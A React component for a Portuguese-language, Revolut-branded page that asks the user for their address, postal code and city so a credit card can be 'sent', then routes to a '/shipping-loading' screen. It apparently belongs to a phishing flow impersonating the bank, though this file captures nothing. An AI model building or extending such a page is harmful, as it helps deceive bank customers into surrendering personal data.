import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import revolutLogo from "@/assets/revolut-logo.png";

const AddressPage = () => {
  const navigate = useNavigate();
  const clientName = sessionStorage.getItem("client_name") || "Cliente";
  const firstName = clientName.split(" ")[0];

  const [address, setAddress] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");

  const formatPostalCode = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 7);
    if (digits.length > 4) {
      return `${digits.slice(0, 4)}-${digits.slice(4)}`;
    }
    return digits;
  };

  const canProceed = address.trim().length > 3 && postalCode.replace(/\D/g, "").length === 7 && city.trim().length > 1;

  return (
    <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col px-5">
      <header className="flex items-center pt-6 pb-4">
        <img src={revolutLogo} alt="Revolut" className="h-10" />
      </header>

      <div className="flex-1 flex flex-col pt-6">
        <h1
          className="text-2xl font-bold text-foreground leading-tight"
          style={{ fontFamily: "'Aeonik Pro', 'Inter', sans-serif" }}
        >
          {firstName}, qual é a tua morada?
        </h1>
        <p className="text-sm text-muted-foreground mt-2 leading-relaxed">
          Introduz a tua morada completa. É para lá que vamos enviar o teu cartão de crédito.
        </p>

        <div className="mt-8 space-y-4">
          <div className="space-y-2">
            <Label htmlFor="address">Morada</Label>
            <Input
              id="address"
              placeholder="Rua, número, andar"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="postal-code">Código Postal</Label>
            <Input
              id="postal-code"
              placeholder="0000-000"
              value={postalCode}
              onChange={(e) => setPostalCode(formatPostalCode(e.target.value))}
              maxLength={8}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="city">Localidade</Label>
            <Input
              id="city"
              placeholder="Ex: Lisboa"
              value={city}
              onChange={(e) => setCity(e.target.value)}
            />
          </div>
        </div>
      </div>

      <div className="pb-10 pt-6">
        <Button
          disabled={!canProceed}
          onClick={() => navigate("/shipping-loading")}
          className="w-full rounded-full font-semibold py-7 text-base pulse"
        >
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default AddressPage;
